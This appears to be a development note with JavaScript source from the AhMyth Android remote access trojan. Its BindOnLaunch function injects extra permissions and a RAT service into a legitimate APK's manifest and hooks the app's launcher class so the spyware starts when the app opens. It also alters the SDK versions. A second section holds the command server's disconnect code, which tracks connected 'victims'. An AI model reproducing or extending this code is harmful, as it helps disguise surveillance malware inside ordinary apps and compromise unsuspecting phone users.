## New Bind on Launch function
> In the testing phases, if tests prove successful, this will be the new bindOnLaunch function, which will also make use of an Updated `copyPermissions` function as well.
```javascript
const fs = require('fs-extra');
const xml2js = require('xml2js');
const dir = require('path');
const readdirp = require('readdirp');
var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');
const apkFolder = '/data/data/com.termux/files/home/flappy';

$appCtrl.copyPermissions = (manifest) => {
    var firstPart = manifest.substring(0, manifest.indexOf("<application"));
    var lastPart = manifest.substring(manifest.indexOf("<application"));

    var permArray = CONSTANTS.permissions;
    for (var i = 0; i < permArray.length; i++) {
        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
        permissionName = permissionName.substring(0, permissionName.indexOf('"'));
        if (firstPart.indexOf(permissionName) == -1) {
            // Check if this is the first permission being added
            if (firstPart.indexOf('uses-permission') == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            } else {
                // Add the permission above the first existing permission
                var index = firstPart.indexOf('<uses-permission');
                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
            }
        }
    }

    return (firstPart + lastPart);
};

$appCtrl.BindOnLaunch = (apkFolder) => {


    delayedLog('[★] Reading the Android Manifest File...\n');
    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
        if (error) {
            delayedLog('[x] Reading the Android Manifest file Failed!\n');
            return;
        }

        delayedLog('[★] Modifying the Android Manifest File...\n');
        const ahmythService = CONSTANTS.ahmythService;
        const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
        const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
        + permManifest.substring(permManifest.indexOf('</application>'));
        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
            if (error) {
                delayedLog('[x] Modifying the Android Manifest Failed!\n', error);
                return;
            }

            xml2js.parseString(data, (err, result) => {
                if (err) {
                    console.error(err);
                    return;
                }

                delayedLog('[★] Searching for a Hookable Main Class in the Android Manifest...\n')
                const launcherActivity = GetLauncherActivity(result, apkFolder);
                if (launcherActivity === -1) {
                    delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
                    delayedLog('[x] Please use Another APK as a Template!.\n');
                    return;
                }

                delayedLog('[★] Locating the Hookable Main Class File...\n');
                const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                    if (err) {
                        delayedLog('[x] Unable to Locate the Hookable Main Class File!');
                        delayedLog('[x] Please Use the "On Boot" Method!\n');
                        return;
                    } else {
                        delayedLog('[¡] Hookable Main Class File Found: ' + launcherPath + '\n');
                    }


                    delayedLog('[★] Reading the Hookable Main Class File...\n');
                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Hookable Main Class File!\n');
                            return;
                        }

                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                        var hook = CONSTANTS.hookPoint;


                        delayedLog('[★] Hooking the Class File...\n');

                        var output = data.replace(hook, startService);
                        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Modifying the Hookable Main Class File Failed!\n', CONSTANTS.logStatus.FAIL);
                                return;
                            }


                            delayedLog('[★] Determining Target SDK Version...\n');
                            fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                if (error) {

                                    delayedLog('[x] Reading the Manifest Target SDK Failed.');

                                    return;
                                }


                                delayedLog('[★] Modifying the Target SDK Version...\n');


                                var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/

                                var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                .replace(compSdkVerNameRegex, "$111" + '"')
                                .replace(platVerCoRegex, "$122" + '"')
                                .replace(platVerNameRegex, "$111" + '"');

                                fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                    if (error) {

                                        delayedLog('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);

                                        return;
                                    }

                                    fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                        if (error) {

                                            delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!\n");

                                            return;
                                        }

                                        var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                        var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                        var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                        .replace(tarSdkRegex, "$122'");

                                        fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                            if (error) {

                                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");

                                                return;
                                            }
                                            $appCtrl.copyAhmythFilesAndGenerateApk
                                        });
                                    });
                                });
                            });

                        });

                    });

                });

            });

        });
    });

};

function delayedLog(message) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        console.log(message);
    }, count * 1000);
};

function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}

function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
    .on('data', (entry) => {
        found = true;
        var {
            path, stats: {}
        } = entry;
        var output = `${JSON.stringify(path)}`;
        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
    })
    .on('end',
        () => {
            if (!found) {
                callback('[x] Unable to Locate the Hookable Main Class File!');
                callback('[x] Please Use the "On Boot" Method!\n');
            } else {
                callback(null, launcherPath);
            }
        })
    .on('error',
        (err) => {
            callback(err);
        });
}
```

## Disconnect Function
```javascript

/* main.js - bottom of the file itself */
ipcMain.on('SocketIO:Stop', function () {
  stopServer();

  // send a message to the renderer process indicating that the server has stopped
  mainWindow.webContents.send('SocketIO:ServerStopped');
});

function stopServer() {
  if (IO) {

    // close all connected sockets
    Object.values(IO.sockets.sockets).forEach(socket => {
      socket.close();
    });

    // stop listening
    IO.httpServer.close();
    IO = null; // reset IO to null
  }
}

```

```javascript

/* /* AppCtrl.js - Below Listen coding */

// when user clicks Disconnect Button
$appCtrl.Stop = (port) => {
  if (!port) {
    port = CONSTANTS.defaultPort;
  }

  // notify the main process to disconnect the port
  ipcRenderer.send('SocketIO:StopListen', port);
  $appCtrl.Log("[¡] Stopped Listening on Port: " + port, CONSTANTS.logStatus.INFO);
};

// fired when main process sends any notification about the ServerDisconnect
ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
  delete viclist[index].ip;
  $appCtrl.$apply();
});

// fired if stopping the listener brings error
ipcRenderer.on('SocketIO:StopListen', (event, error) => {
  $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
  $appCtrl.$apply();
});

// notify the main process to close the lab
$appCtrl.closeLab = (index) => {

  ipcRenderer.send('closeLabWindow', 'lab.html', index);

};

```

```javascript

/* LabCtrl.js */

// fired when notified from Main Proccess (main.js) about
// this victim who disconnected
ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
  $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
});

// fired when the server is stopped
ipcRenderer.on('SocketIO:ServerStopped', (event) => {
  $rootScope.Log('Server Stopped', CONSTANTS.logStatus.SUCCESS);
});
```

```html
<!-- index.html -->

<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon"></i>Stop</button>

```
